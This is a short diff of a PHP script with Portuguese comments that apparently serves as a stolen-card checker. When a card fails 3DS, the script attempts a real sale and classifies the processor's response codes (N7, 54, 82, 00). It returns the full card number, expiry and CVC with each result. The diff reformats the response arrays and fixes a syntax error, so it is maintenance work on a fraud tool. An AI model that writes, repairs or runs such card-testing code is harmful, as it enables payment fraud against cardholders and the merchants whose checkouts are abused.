@@ -410,17 +410,30 @@ switch ($action) {
         }
 
         // 2ª CHANCE: Se não passou no 3DS, prossegue para testar a venda e validar se o retorno é N7, 54, 82 ou 00
+                // 2ª CHANCE: Se não passou no 3DS, prossegue para testar a venda
         $r = criarVenda($offerId, $prod['short_id'], $prod['id'], $card, $installments);
 
         if ($r['code'] !== 200 || empty($r['body'])) {
-            jsonResp(['card' => $numero, 'exp' => $parts[1] . substr($parts[2], -2), 'cvc' => $parts[3],
-                'status' => 'ERROR', 'rc' => 'RC_NA', 'msg' => 'HTTP ' . $r['code'] . ' ' . $r['err']]);
+            jsonResp([
+                'card' => $numero, 
+                'exp' => $parts[1] . substr($parts[2], -2), 
+                'cvc' => $parts[3],
+                'status' => 'ERROR', 
+                'rc' => 'RC_NA', 
+                'msg' => 'HTTP ' . $r['code'] . ' ' . $r['err']
+            ]);
         }
 
         $resp = json_decode($r['body'], true);
         if (!is_array($resp)) {
-            jsonResp(['card' => $numero, 'exp' => $parts[1] . substr($parts[2], -2), 'cvc' => $parts[3],
-                'status' => 'ERROR', 'rc' => 'RC_NA', 'msg' => 'Resposta invalida']);
+            jsonResp([
+                'card' => $numero, 
+                'exp' => $parts[1] . substr($parts[2], -2), 
+                'cvc' => $parts[3],
+                'status' => 'ERROR', 
+                'rc' => 'RC_NA', 
+                'msg' => 'Resposta invalida'
+            ]);
         }
 
         $class = classificar($resp);
@@ -428,7 +441,7 @@ switch ($action) {
 
         $result = $class;
         $result['card'] = $numero;
-        $result['exp' => $parts[1] . substr($parts[2], -2);
+        $result['exp'] = $parts[1] . substr($parts[2], -2);
         $result['cvc'] = $parts[3];
         $result['tempo'] = round(microtime(true) - $inicio, 2);
 
